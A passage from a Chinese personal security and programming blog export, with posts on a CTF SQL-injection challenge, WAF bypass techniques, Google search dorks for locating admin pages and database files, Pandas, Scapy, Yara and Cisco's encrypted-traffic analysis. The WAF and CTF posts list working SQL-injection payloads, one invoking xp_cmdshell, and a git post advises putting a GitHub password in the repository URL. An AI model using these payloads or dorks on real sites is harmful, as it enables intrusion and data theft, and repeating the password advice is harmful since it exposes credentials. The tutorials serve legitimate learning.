进入页面发现啥也米有，于是点开页面源码发现了隐藏的信息： 这个题目坑的是，我一开始以为过滤函数有俩：htmlentities()和stripslashes(),前面那个函数的作用很复杂，具体的看：htmlentities函数详解，在这里是过滤单引号(‘)和双引号的(“)，后面的那个函数是删除反斜杠的（\\）的。然后我想了半天，这三个全给过滤了咋搞啊，最后我才发现stripslashes()这个函数在if里面，根本不执行！坑死兔子了，吐着血构造语句： http://chinalover.sinaapp.com/web15/index.php?username=\\&amp;password=or 1=1%23 这样构造是因为原来的sq查询语句就变成了： SELECT * FROM users WHERE name=&apos;\\&apos; AND pass=&apos;or 1=1#&apos;; 由于\\把’转义了，所以name等于(‘ AND pass=)，然后pass可以直接注入语句，结果如下： 题目五：SQL注入2题目地址：SQL注入2 进入SQL注入2的界面发现跟SQL注入1的界面一毛一样，看来作者是真的懒得做页面，那肯定查看源码也能得到情报了： 既然题目提示用union，我思考了一下确实用union最简单，算是考察对union的理解了，这个关键字等于是将上表与下表连接起来，如果上表为空，那么结果直接为下表。以此为思路看这个题目，没有任何过滤，那么我们可以使上表查询为空，下表构造成一个我们已知的值，那么查询的结果就是我们构造的值： 发现失败了，检查了一下发现对参数pass进行md5转码了，重新构造语句： user=kk&apos; union select md5(1)#&amp;pass=1 总结南邮的题目还是很适合入门的，一套做下来还是收获颇多，希望这周的比赛能拿个好成绩，等比赛结束后会将南邮的两个综合题做个详细的解题过程给大家。","tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://yoursite.com/tags/sql注入/"},{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"Git错误“fatal：could not read Username for 'https://github.com'：No error”解决方案","date":"2018-02-27T03:40:32.000Z","path":"2018/02/27/giterror/","text":"年后回来，小白兔觉得不能再慵懒下去，打算立刻发了一篇博文以正视听，好不容易写完一篇绕过WAF的九种方法，按照往常的方法更新博客，结果报错：“fatal: could not read Username for ‘https://github.com‘: No error”。 问题 真的是大写的懵逼，啥也没动啊，咋过个年回来就出问题了呢，问题截图如下： 于是我折腾了很久终于找到了解决问题的方法。 解决方法解决问题方法如下，亲测有效。1.打开_config.yml，修改其中的deploy节点原来的配置为： deploy: type: git repo: https://github.com/{yourname}/{yourname}.github.io.git branch: master 修改为如下： deploy: type: git repo: https://{yourname}:{yourpassword}@github.com/{yourname}/{yourname}.github.io.git branch: master 2.更新博客（素质三连） hexo clean hexo g hexo d","tags":[{"name":"博客","slug":"博客","permalink":"http://yoursite.com/tags/博客/"}]},{"title":"绕过WAF的9种方法","date":"2018-02-27T03:39:32.000Z","path":"2018/02/27/WAFbypass/","text":"web应用程序防火墙(或WAF)是一种过滤器、监视器，并从web应用程序阻塞HTTP流量。WAF与常规防火墙的区别在于，WAF能够过滤特定web应用程序的内容，而常规防火墙充当服务器之间的安全通道。通过检查HTTP流量，它可以防止来自web应用程序安全缺陷的攻击，例如SQL注入、跨站点脚本(XSS)、文件包含和安全性错误配置。 WAF种类 异常检测协议（Exception Detection Protocol）：拒绝不符合HTTP标准的请求 增强输入验证（Enhanced input validation）：加入代理和服务器端验证，而不仅仅是用户端验证 黑名单（Blacklist）/白名单（WhiteList） 基于规则和异常的保护机制（Rule-based and exception-based protection）：更多通过规则结合基于黑名单的机制，基于异常的更加灵活 国家管理（State management）：关注session保护，也包括Cookies技术保护，反入侵技术保护，响应监控和信息披露保护 WAF绕过方法1.大小写混淆(Mixed Case)将会触发WAF保护的恶意输入词修改进行大小写混淆，比如union可以变成uNIoN，如果WAF是基于黑名单的恶意词过滤，那这么做就可以绕过过滤。 http://target.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4 2.替代关键字(Replace the keyword)在目标关键词中插入将被WAF删除的特殊字符，比如SELECT可以变成SELselectECT，一旦会被删除的字符被删除，正常字符就会被传递，这样就能绕过过滤。 http://target.com/index.php?page_id=-15&amp;nbsp;UNIunionON SELselectECT 1,2,3,4 3.编码(Encode)+URL编码：page.php?id=1%252f%252a*/UNION%252f%252a /SELECT+Hex编码：target.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4+Unicode编码：?id=10%D6‘%20AND%201=2%23 4.使用注释(Use comments)在攻击字符串中插入注释。比如，/!SELECT/可能会被WAF忽略，但是会被传递到目标应用程序并由mysql数据库处理。 index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3,4 5.等效函数和命令(Equivalent functions and commands)一些函数或命令不能被使用，因为这些关键字被检测到，但在许多情况下，我们可以使用相同或类似的代码。 hex()、bin() ==&gt; ascii() sleep() ==&gt;benchmark() concat_ws()==&gt;group_concat() substr((select &apos;password&apos;),1,1) = 0x70 strcmp(left(&apos;password&apos;,1), 0x69) = 1 strcmp(left(&apos;password&apos;,1), 0x70) = 0 strcmp(left(&apos;password&apos;,1), 0x71) = -1 mid()、substr() ==&gt; substring() @@user ==&gt; user() @@datadir ==&gt; datadir() 6.特殊符号(Special symbols)这里我有一些特殊符号的非字母数字字符种类，特殊符号往往具有特殊的意义和用法。 · &apos; 符号: select &apos;version()&apos;; · +- 符号: select+id-1+1.from users; · @ 符号: select@^1.from users; · mysql函数xxx · `、~、!、@、%、()、[]、.、-、+ 、|、%00 例子： &apos;se&apos;+&apos;lec&apos;+&apos;t&apos; %S%E%L%E%C%T 1 1.aspx?id=1;EXEC(&apos;ma&apos;+&apos;ster..x&apos;+&apos;p_cm&apos;+&apos;dsh&apos;+&apos;ell &quot;net user&quot;&apos;)&apos;or --+2=- -!!!&apos;2 id=1+(UnI)(oN)+(SeL)(EcT) 7.HTPP参数控制(HTTP parameter control)提供多个相同名称的参数，以混淆WAF。比如http://example.com?id=1&amp;?id = 1&#39; or &#39;1&#39; = &#39;1&#39; --在某些情况下,例如Apache / PHP应用程序只会解析的最后的id =…，而WAF只会解析第一个。它不是一个合法的请求，但应用程序仍然接收和处理恶意输入。大多数WAF的今天都不容易受到HTTP参数污染(HPP)的影响，但是在构建绕过语句时仍然值得一试。 /?id=1;select+1,2,3+from+users+where+id=1— /?id=1;select+1&amp;amp;id=2,3+from+users+where+id=1— /?id=1/**/union/*&amp;amp;id=*/select/*&amp;amp;id=*/pwd/*&amp;amp;id=*/from/*&amp;amp;id=*/users 8.缓冲区溢出(Buffer overflow)WAF的应用程序和其他应用程序一样容易受到软件缺陷的影响。如果缓冲区溢出条件可能导致崩溃，即使它不会导致代码执行，这可能导致WAF失败。换句话说，也是一种绕过。 ?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 9.集成（Integration）集成意味着使用多种绕过技术，一种技术可能无法绕过过滤机制，但是使用多种技术的可能性会增加很多。 target.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4… id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– - ?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--","tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/渗透/"},{"name":"WAF","slug":"WAF","permalink":"http://yoursite.com/tags/WAF/"}]},{"title":"Pandas库中DataFrame的浅析（2）","date":"2018-01-15T03:17:32.000Z","path":"2018/01/15/dataFrame-2/","text":"上一篇博客我进行对Pandas库中DataFrame这个结构体进行简介，并且详细地介绍了如何去定义一个DataFrame以及定义时参数的作用，还介绍了如何去获取一个DataFrame的基本信息。本章主要讲解如何对DataFrame进行基本的行列操作。 对DataFrame中的列进行操作还是以上一篇中定义的DataFrame作为例子来进行讲解。 获取列当需要获取单个列时，采用df[‘列名’]的形式获取： 可以看到获取的列的类型是Series，其实在DataFrame中，任何一列或一行都是一个Series，实际上DataFrame可以被视为由一条条Series构成的。 当需要获取多个列时，采用df[[‘列名1’，’列名2’,…]]的形式获取： 可以看到，当提取多个列时，返回的类型依旧是DataFrame，就像是提取了一个子集。 添加和删除列当需要获取添加列时，采用df[‘新列名’]=pd.Series(…)的方式获取，原理是DataFrame的每一行或每一列都视为一个Series： 而删除一个列则使用del df[‘要删除的列名’]的格式： 但是，虽然上述方法可以快速而简洁地完成添加和删除列的操作，小白兔还是推荐大家使用insert和drop方法来实现列的添加和删除。insert的优点在于可以指定新添加列插入的位置，而drop方法则是通过返回一个新的DataFrame来保留原来的数据： 而多个列的添加/删除方法留给读者自己思考，提示:和多个列的选择相似。 移动列移动某个列实际上是将列的添加删除操作结合使用： pop函数的作用是从DataFrame中获取这一列并从原结构中删除。 对DataFrame中的行进行操作获取行当需要获取DataFrame的行时，采用如下方式获取： 可以看到单行和多行的获取方式其实相同，采用的是切片的方式。 添加行Pandas中并没有直接进行添加的函数或方式，但是我们可以通过切割再重组的方式实现添加，比如我们在第二行插入一组数据： concat函数时作用是将指定顺序的DataFrame进行拼接。 删除行删除行我们依然使用drop函数，不过其中axis参数设置为1： 可以看到，第2行的数据被成功删除了， 行列组合操作选择指定的行与列可以使用df.loc[x:x,[‘列名1’,’列名2’..]]的格式来得到一个矩形DataFrame： 选择一个指定的元素值可以使用df.at[x,’列名1’]的格式来得第x行，列名为’列名1’的元素： 总结本章讲解了DataFrame的基础操作，包括行列的选择，添加删除操作，以及组合操作。下一章将讲解DataFrame一些进阶性的复杂操作，如果文章对你有帮助，请支持一下哦^3^。","tags":[{"name":"pandas","slug":"pandas","permalink":"http://yoursite.com/tags/pandas/"},{"name":"Dataframe","slug":"Dataframe","permalink":"http://yoursite.com/tags/Dataframe/"},{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"Pandas库中Dataframe的浅析（1）","date":"2018-01-03T03:31:32.000Z","path":"2018/01/03/dataFrame-1/","text":"Pandas是一个由python编写的库，其中包含了大量数据类型和函数。起初，Pandas是作为金融数据分析工具而被开发出来，如今它已经应用于多个领域的数据分析、挖掘。Pandas拥有两个重要的数据类型：Series和DataFrame，简单来讲，Series就像一个一维的数组，而DataFrame就像一个二维的表格。而本篇博客的主要内容是对DataFrame结构体的浅析。 DataFrame的参数简介DataFrame的官方定义如下： class pandas.DataFrame(data=None, index=None, columns=None, dtype=None, copy=False) 其中的参数解释如下： data：需要导入的数据，允许的数据类型为array（numpy的数据类型）、dict（字典）、list（列表）、DataFrame。 index：行标签，默认为0开始的等差数列。 columns：列标签，默认为0开始的等差数列。 dtype：指定数据类型 copy：从输入值中拷贝数据，只对输入为DataFrame或者二维数组时有影响 对参数的图解字典是最常用的数据类型，是python自带的，下面用该类型作为参数data输入来解释其他参数。 导入库通过import来导入pandas库，由于pandas中有些函数和数据类型需要用到numpy中的数据类型，所以也需要导入numpy库。 通过字典定义一个简单DataFrame类型首先定义一个简单的字典，字典内每一个key的值都为一个list（列表），再作为data导入到DataFrame中，生成一个简单的DataFrame。 可以看到，这个最简单的DataFrame，行标签是以0开始的等差数列，而列标签是字典中的key，每一行的值都是字典中key的list对应位置的值。可以看到，由于list是有序的，所以每条列标签下的数据都是按定义时排列的，但由于字典是无序的，所以列标签的顺序是不按定义排序的。 那么怎么使列标签按我们想要的顺序排序？需要使用columns参数： 从图中可以看到，当我们定义columns函数，列表标签就如我们所想的顺序排列。但是如果参数columns传入时和字典中的key不匹配会怎么样？ 通过上面三种不匹配方式：多、少、错，可以分析出当定义columns参数时，DataFrame会先按columns定义的构造表格（按顺序），然后再去字典中搜索匹配的key，如果不存在，那所有数据都为NaN。 如果不希望行标签按默认的等差数列排序，那可以用index参数来定义： 可以看到，index定义了行标签，其性质与columns相同，只是一个定义行，一个定义列。所以当参数中index和columns被使用时，DataFrame会优先按这两个参数构造表格，再去字典中搜索匹配，匹配失败的都为NaN。 当使用dtype参数时，数据都会被转化成制定的类型，当然该参数只对数字型数据有效，string和bool都不受影响。 其他data数据类型定义DataFrameDataFrame定义时data参数允许的数据类型不止字典，还可以是list、array、DataFrame。DataFrame就不说，用自己去定义自己，我也不知道为什么谁会都这么迷的方式去定义，但原则上确实是可以理解的。而list和array在某种意义上十分相似，唯一的不同是，list允许内部值值数据类型不同，而array不允许。 值得注意的是，使用list或array定义数据的时候，每一个内部的list都代表一行的数据，这与字典不同，字典中每一个list都代表一列的数据。其他参数都与前面使用基本相同，而值得注意的是，当在list或array作为数据导入时，定义columns参数时，将不依靠匹配来填充表格，而是纯粹靠位置信息来填充。 获取DataFrame的信息DataFrame中拥有许多直接获取信息的函数和属性，可以直接调用，十分方便。 首先定义一个简单的DataFrame作为测试： 获取列标签信息、行标签信息、数据信息： 想要使用操作时，可以使用.tolist()函数将数据类型转化为list，然后当做list去操作： 总结本章讲解了如何定义一个DataFrame类型的数据类型，并详细介绍了不同参数的用法以及DataFrame的基础信息获取，下一章将详细讲解如何对DataFrame进行行列操作。","tags":[{"name":"pandas","slug":"pandas","permalink":"http://yoursite.com/tags/pandas/"},{"name":"Dataframe","slug":"Dataframe","permalink":"http://yoursite.com/tags/Dataframe/"},{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"对战加密的恶意流量：将机器学习应用到恶意软件识别中去","date":"2017-12-07T03:39:32.000Z","path":"2017/12/07/eta/","text":"从2015年开始，思科信息安全团队中一位名叫Rich West的系统架构师就一直在与思科高级安全研究小组的一名工程师尝试去解决一个非常新颖的问题：思科信息安全团队希望能够找到一种方法来更好地保护思科员工的信息安全，并防止恶意软件通过加密流量窃取员工的个人隐私数据。但当时似乎只有一种可行的方法，即通过设置代理并解密通信数据来检查所有的SSL和TLS流量。 如果是在恶意活动中，那么上述这种“可行方法”就是我们常说的中间人（MitM）攻击。但即便是出于安全防御端的角度来看，这种方法仍然会被视为一种侵犯用户隐私的行为，因为当用户需要向银行或加密邮件服务发送加密通讯信息时，上面的这种方法就会破坏加密信任链，从而导致用户隐私受到侵害。除此之外，这种方法的计算量也非常高，而且高到足以造成网络性能的大幅下降，更不用说管理额外的SSL证书（流量被检查之后需要重新签名）所带来的性能负担了。 Rich West和他的团队最终认为，这种以牺牲隐私权和网络性能为代价来换取安全性的方法是不值当的。因此，他们需要一种新的方法，他们需要一种不涉及到向检查节点发送内部流量的方法。为了解决这个问题，West与思科工程师David McGrew取得了联系。 一个待解决的复杂问题McGrew是思科高级安全研究小组的一员，他和他的团队一直都在研究如何使用NetFlows配合新的算法来检测恶意软件。当West将他的需求（设计一种新的方法在加密数据中识别恶意攻击）告知了McGrew的团队之后，这个耗时长达两年的项目便诞生了，而且该项目现在已接近完工。这个项目集合了多款新型网络产品和软件，旨在从根本上改变现代网络的底层架构和驱动模型，而思科在本周已经正式对外公布了该项目。McGrew和他的团队所开发来的这种模型名叫Encrypted Traffic Analytics（ETA），即加密流量分析模型。思科公司手中掌握有庞大的网络资源和数据资源，思科也一直希望将手中的这些资源结合自动化技术以及机器学习来实现无处不在的安全保护，而ETA模型的出现让思科离这个目标近了一大步。 数据加密通常都会被认为是一件好事，因为加密不仅能够保证网络交易和聊天的私密性，而且也可以防止攻击者（中间人攻击）窥探或篡改用户的网络通信数据。 随着越来越多的企业环境开始使用云服务，这也让Google和Mozilla这样的公司开始强制网站去使用TLS等安全传输协议了。各大浏览器厂商首先要求所有的加密流量必须由受信任的证书机构（CA）所颁发的证书来进行签名，而相关机构也在努力试图通过简化证书申请以及流量加密等过程来推广TLS的使用。但正是因为加密所需的成本降低了，而且几乎毫无成本，所以很多网络攻击者也开始通过普通的TLS或SSL流量来试图掩盖他们的恶意命令、远程控制行为以及数据窃取活动。 想要在普通流量中检测恶意软件的活动本身就是一件非常复杂的事情，而且还涉及到海量数据分析等情况，再加上TLS和SSL等加密协议的出现，使得目前所面临的挑战难上加难。但对于McGrew来说，这正是让他激动不已的地方。 NetFlow中包含有大量有价值的信息，但它也会受到一定的语境限制。它可以表示网络上的两台设备正在交互，以及通信时长和发送的字节数等等，但这些数据毕竟还是不完整的。McGrew认为，隐私和安全并不应该是必须二选一的，为了解决这个复杂的问题，他不仅需要从头开始，而且还需要涉及到大量代码和密集的数据建模。 ‘好吧，你到底需要什么？’ – ‘数据，很多很多的数据。’这个项目需要大量的资源，所以McGrew首先想到了思科的技术投资基金（Tech Fund）。思科的“Tech Fund”项目通常投资的都是那些能够改变现状的新型产品或高新技术，而且这些项目通常都需要好几年的开发时间。 就算有了资金做保障，但在真正形成项目并开始编码之前，McGrew还需要从思科的网络系统中获取数据分析样本，包括恶意软件样本在内。为了解决这个问题，McGrew在2015年3月份邀请了Blake Anderson加入。Anderson是一名拥有博士学位的数据科学家，他主要研究的是机器学习在网络安全中的应用。当时，他也正在与美国洛斯阿拉莫斯国家实验室一起研究如何将机器学习方法应用到恶意软件的分析过程中。 当Anderson加入到思科这个团队时，McGrew的团队正在开发相应的分析工具，而且他们已经可以通过NetFlow数据来识别出具体的应用程序了。比如说，他们可以识别出NetFlow数据是来源于Chrome浏览器还是来源于微软的更新服务，不过他们还没有将这项技术应用到针对恶意软件的数据分析活动中。 为了获取到分析样本，Anderson以及McGrew的团队几乎与思科公司的每一个产品部门都沟通过，包括内部信息安全团队、Talos威胁情报小组和ThreatGRID团队等等。在花费了几个月的时间编写了一万多行代码之后，McGrew和Anderson便开始将他们的数据模型应用到实际的测试中。在获取到了数百万的数据包和已知的恶意软件样本之后，Anderson开始尝试在不进行任何解密的情况下对海量数据进行筛选和归类，并通过“最具描述性的特征”来识别出恶意流量和正常流量。Anderson表示：“我认为收集正确的数据才是最重要的。很多人会在收集到了大量数据之后才去考虑他们能用这些数据去做什么，但我们打算采取相反的做法，我们会列出我们所需要的数据类型，然后再从思科的其他产品团队那里收集这些数据。” 隐藏的恶意软件与指纹如果网站拥有权威CA签发的TLS证书，这意味着用户可以放心地访问这个网站，但这并非绝对。据了解，至少从2009年起，很多攻击者就开始通过使用伪造的、窃取来的、甚至是合法的SSL签名证书来欺骗互联网的信任系统。这样一来，攻击者就可以通过安全证书来诱使用户交出自己的登录凭证或下载恶意Payload。 在过去的几个月里，滥用合法TLS证书的攻击事件数量呈上升趋势，这很可能是由于类似Let’s Encrypt这样的CA机构开始免费签发TLS证书所导致的。这也就意味着，网络钓鱼攻击者将能够轻而易举地制作出足以以假乱真的PayPal或比特币钱包钓鱼网站。比如说，下图所示的就是一个使用了免费加密证书的钓鱼网站：事实证明，降低密钥的获取难度确实是一把双刃剑 Rich West认为，从某种程度上来说，他们的成功是以牺牲其他安全部门作为代价的。他们一直在敦促IT公司、厂商和App开发者通过加密技术来保证数据的安全，但这样也增加了处理这些加密数据的难度。不过幸运的是，通过对数百万TLS数据流、恶意软件样本和数据包进行了分析之后，Anderson和McGrew发现TLS数据流中未加密的元数据包含攻击者无法隐藏的数据指纹，而且即使数据经过加密也无法隐藏这种指纹。TLS擅长的就是隐藏明文信息，但它所创建出来的还有一系列可观测的复杂参数，而McGrew和Anderson这样的工程师就可以用这些数据来训练他们的模型了。 比如说，当一段TLS流量开始发送时，首先从一个握手包开始。客户端（比如说Chrome浏览器）会给其尝试通信的服务器发送ClientHello消息。“Hello”消息包含一组参数，例如使用的密码套件、接受的版本以及可选的扩展。但类似“ClientHello”这样的TLS元数据是没有被加密的，因为它们在消息开始加密之前就发送出去了。这也就意味着，Anderson的模型可以在完全不知道消息内部数据的情况下对这些未加密的数据进行分析，而该模型将准确地分辨出该流量来自于恶意软件还是普通活动。 展望Anderson表示，他希望ETA能够通过软件代码更新等形式应用到任何地方，并给网络上的任何设备提供恶意软件识别服务，因为ETA的目标就是让任何需要处理网络数据的设备都变成安全设备。Anderson说到：“我们接下来会想办法将我们的技术应用到路由器和交换机上，这是非常有意义的。在这个过程中，我们依然可以通过云端来训练我们的模型，并将机器学习与网络层联系起来。” *译文转载自FreeBuf.COM，英文原文来源：swc，ETA项目开源地址：cisco。","tags":[{"name":"流量","slug":"流量","permalink":"http://yoursite.com/tags/流量/"},{"name":"加密","slug":"加密","permalink":"http://yoursite.com/tags/加密/"},{"name":"机器学习","slug":"机器学习","permalink":"http://yoursite.com/tags/机器学习/"}]},{"title":"Scapy库解析数据流SSL/TLS加密","date":"2017-11-14T03:39:32.000Z","path":"2017/11/14/python-scapy-ssl_tls/","text":"上一篇博客我详细地介绍了关于Python的Scapy使用，而常规的scapy库只能解析到传输层，传输层再往上的协议都无法解析，且剩余所有的原始16进制数据都存在Raw中。而在实际的工作中，我们往往是需要解析出流是否存在SSL/TLS加密的，wireshark就能很好解析出这些，那么scapy也能实现吗？自己写源码解析是个巨大的工程，我们这些单体开发人员望而却步，所以python提供了一个附加库scapy-ssl_tls来补充解析ssl/tls加密的功能。 安装scapy-ssl_tls库关于scapy-ssl_tls的安装很简单，直接使用pip安装： pip install scapy-ssl_tls 就可以完成安装了，需要注意的是，这个python的附加库只支持python2.7及以下的版本。在linux中下载安装这个库时，它会自动检测系统中是否安装了scapy，若无，则自动安装scapy以及相关的库，十分方便，在一定程度解决了许多问题。当然，我也知道有朋友看了我上篇博客，已经入了python3的深坑，那我也得负责，于是我找到了一位大牛写的支持python3的SSL/TLS解析库，附上链接：here。 导入scapy-ssl_tls库在使用scapy-ssl_tls库时，需要输入语句： from scapy_ssl_tls.ssl_tls import * 就可以使用了，值得注意的是，导入这个库的同时，scapy中的方法也已经被却全部导入，所以不需要再导入一遍scapy库。 使用scapy-ssl_tls库关于scapy-ssl_tls库的使用也没什么特别的，函数方法和scapy差不多，只不过在scapy的基础上，会自动解析ssl/tls加密，具体效果如下： 使用show()函数可以打印出具体的加密信息： 感谢支持感谢阅读，喜欢的话可以订购，订购rss：here ,支持我请将鼠标下滑到赏，欢迎评论！","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"流量","slug":"流量","permalink":"http://yoursite.com/tags/流量/"},{"name":"加密","slug":"加密","permalink":"http://yoursite.com/tags/加密/"}]},{"title":"使用Python的Scapy库解析Paca文件","date":"2017-11-07T12:08:32.000Z","path":"2017/11/07/python-scapy/","text":"Scapy 是一个强大的交互式数据包处理程序（使用python编写）。它能够伪造或者解码大量的网络协议数据包，还能够发送、捕捉、匹配请求和回复包等等。关于网络数据包的解析，其实wireshark这款经典的工具已经能满足大部分工作人员的需求，但是涉及到一些复杂的、自定义型的数据包解析，仅用wireshark就有点不够看了。这次我使用的是一个Python的库Scapy,对于解析pcap文件它算是一个冷门库，网络上关于它的资料实在少的可怜，所以我只能撸起袖子自己开搞，最终一步步用它解析pcap文件。 安装Scapy关于Scapy的安装参考如下： pip3 install scapy-python3 yum install libffi-devel pip3 install cryptography ln -s /opt/python/bin/scapy /usr/bin/scapy 就可以完成安装了，之后可以在命令行中输入Scapy来进入交互式命令来检验安装是否成功。但是需要注意的，我是在linux的python3的环境下成功安装的，2.7以及window的安装会麻烦很多（亲身体验过），所以还是建议使用linux和python3。安装成功以后，在python文件中使用 from scapy.all import * 就可以导入并使用scapy库了 解析pcap文件读取pcap文件通过阅读使用手册，我找到了读取pcap文件使用的语句： rdpcap(&quot;xxx.pcap&quot;) 这个语句可以读取一个pcap文件，并返回一个数据类型，我们来实验一下： 可以看到，当我们直接打印这个变量（pcaps），可以直接得到数据包的总概况，图中我传入的pcap文件中只有7个TCP数据包。通过查阅资料，我知道了这个类型的用法类似于List，我们可以直接调用每个数据包： 我一开始选择直接打印第一个数据包，结果出现了一堆乱七八糟的十六进制数据，看的我一脸懵逼，这样肯定是不行的，于是我查了一下这个变量的数据类型： 结果查出一个没见过的数据类型，于是我决定去help中查一下这个类型。我先在命令行中直接输入Scapy进入交互命令环境，最后输入 help(scapy.layers.l2.Ether) 显示的界面如下： 一阅读help，我就看到了上图中的三个函数中的mysummary，这个函数的效果是返回一个字符串标明来源和目的地，但是我抱着试一试的态度直接打印了这个指针，结果返回值： 直接返回了我们看得懂的，可以操作的值！只要str（）字符串化一下，我们可以提取出包里所有的特征了，接下来就是字符串的处理了。 提取数据包特征当然，只到上一步肯定是有朋友不满意的，处理字符串太麻烦了，难道没有直接提取包中的特征的办法？为了解决这个问题，我继续了研究，然后我就在help中发现了show()这个函数： 可以看到数据包的层次、字段被排列的很清晰，为了方便大家查看，我把wireshark的图也附上： OK！可以确定只要wireshark能解析出来的，scapy也都能解析出来，下面就是单独提取字段的问题了。看着show显示的排列结果，我突然有了一个大胆的想法，排列出的字段名缩写会不会就是属性？于是我试了一试： 果然，我的猜想是正确的！这样每一个特征就可以单独提取出来了，搞定，写完收工。 新的问题和解决咳咳，收工只是个玩笑话，因为很快就会有朋友发现问题，IP和TCP都有’chksum’、’options’和’flags’这3个字段，packet的这三个属性到底属于谁？实验了一下： 可以发现，着三个属性都属于IP的字段，那TCP的这三个字段怎么提取？在一番尝试失败后，我只能不太情愿地捡起了源码看。经过了很长一段时间的研究后，我终于找到了一个函数： haslayer(self, cls)，这是一个判断某一层结构存不存在的函数，实验一下： 可以看到，存在的层返回的值是1（也就是true），而不存在的层返回就是0（也就是false）。于是我顺藤摸瓜，又找到了一个函数 getlayer(self, cls, nb=1, _track=None)，尝试一下： 存在的层可以显示出自己的字段数据，而不存在的层直接报错，这下问题终于解决了！（注：函数中参数可以是’TCP’也可以是TCP） 后续的一些问题 另外的一种分层表达法其实在后来，我在一位大佬的博客（现在找不到了）上看到了一种更方便的表达方法来实现分层字段显示： 可以看到这种方式和我之前实验的方式结果差不多，不过表达更加简洁。 关于其他的一些字段如果要统计流的一些属性，流的时间和包的总大小是必备的，属性如下： 因为是第一个包，所以时间值就是一个基准值，其他的包可以通过这个值计算出自己到达的相对时间，wireshark中关于这些值都已经给你统计好了，不过我们也可以通过一些简单的计算得到这些值。包的长度用len()这个函数统计，值得注意的是，packet.len这个值是属于IP包长度的值，在上图已经标出，切勿混淆。 关于应用数据（报文）的获取关于报文的获取是用RAW这个层，具体看下图： 可以看出，根据这个信息可以判断一个包的数据是否加密（如果不存在应用层数据（三次握手等），使用RAW就会直接报错）。 其他很抱歉，之前由于域名的问题博客无法访问，我也一直没有机会发博客，现在小白兔的博客已经恢复正常了，而且进行了美化，开放了RSS订阅和评论，支持我请把鼠标下移到“赏”，谢谢大家！","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"流量","slug":"流量","permalink":"http://yoursite.com/tags/流量/"}]},{"title":"Yara：恶意软件检测神器","date":"2017-10-21T07:08:32.000Z","path":"2017/10/21/Yara/","text":"yara是一款用于帮助软件研究人员检测恶意软件和代码的开源工具，可以分析各种文件以及正在运行的进程。 Yara支持的系统平台 Yara工具自带了一个小型的搜索引擎，可以在window、linux、MacOS系统上运行，而且支持python扩展，允许通过python脚本访问搜索引擎。 Yara的使用构成：Yara的使用由三部分构成：yara工具、规则文件、目标文件（进程） yara工具我在yara工具的安装时遇到各种各样的问题，花了很多时间，总结如下1.推荐用python自带的pip来安装: pip install yara yara-ctypes -h 2.yara工具与linux的亲和度比较高 yara规则文件yara的规则的标识符类似于C语言结构，其规则声明以rule标识，在规则描述中可以包括字母、数字甚至下划线字符，但字符串第一个字符不能是数字，且单条描述不能超过128个字符。和C语言一样，YARA规则也有关键字，具体的规则文件编写可以参考yara文档说明。 目标文件yara的检测目标可以是文件也可以是进程，在命令行中输入 yara 规则文件 目标文件 就可以执行了，如果是python的话就要调用yara-ctype来执行，用–help可以查看参数要求。 Yara的规则库的收集：yara的强大在于它可以不断的添加规则进入自己的规则库来强化自己，所以开发人员对规则库的收集和填充是十分重要的，但是由于yara在国内使用的贫瘠，yara库的收集并不容易。目前网络上的开源规则库，基本上来自国外的恶意软件分析提取、安全研究室的开源、安全社区的开放以及个人大牛的共享。 Yara的未来：随着国内对网络安全越来越重视，可以预见Yara在国内势必引来一波流行期，到时网络上的规则文件共享会越来越多，大家注意在下载某些个人共享的规则文件时，要注意可能刻意隐藏在其中的恶意代码，会对你的电脑形成攻击漏洞。这篇博客就到这里，谢谢大家！","tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"},{"name":"工具","slug":"工具","permalink":"http://yoursite.com/tags/工具/"}]},{"title":"Google高级搜索hacker技巧","date":"2017-10-16T07:08:32.000Z","path":"2017/10/16/googlesearchskill/","text":"用好google的搜索引擎是每个小黑客的必备技能，下面我来总结一下高级搜索的入门常用关键字。 Google高级搜索关键字 高级搜索 inurl：xxx 可以查询url中有xxx的网页，可以用来找后台登录页面如： inurl:login_admin.asp 可以用来找上传页面如： inurl:upload_soft.asp 高级搜索 intext：xxx 搜索网页中的制定字符,可以用来查看网站目录如： intext：to paremt directory 高级搜索 Filetype：xxx 搜索指定文件，可以用来查数据库如： Filetype：mdb 高级搜索 site：xxx 查看网页相关页面 组合使用法（示例）： 搜索相关页面（或数据库文件）Site:xxx Filetype:mdbSite:xxx intext: to parent directorySite:xxx intext: to parent directory Filetype:mdb 下载到数据库后，登陆后台管理Site:xxx intitle:管理Site:xxx inurl:login.asp 直接找上传点Site:xxx inurl:upload.asp 注意：robot.txt是针对搜索引擎机器人的存文本文件，可以说明不对robot访问的部分","tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"},{"name":"搜索","slug":"搜索","permalink":"http://yoursite.com/tags/搜索/"}]},{"title":"第一篇博客","date":"2017-10-10T07:08:32.000Z","path":"2017/10/10/first_blog/","text":"这是小白兔第一篇博客新人报到 这是WhiteRabbit小白兔写的第一篇博客下面宣布： 小白兔会不断发表博客 博客内容为计算机安全技术 以及一些学习记录 希望有人喂我萝卜 谢谢大家","tags":[{"name":"博客","slug":"博客","permalink":"http://yoursite.com/tags/博客/"}]}]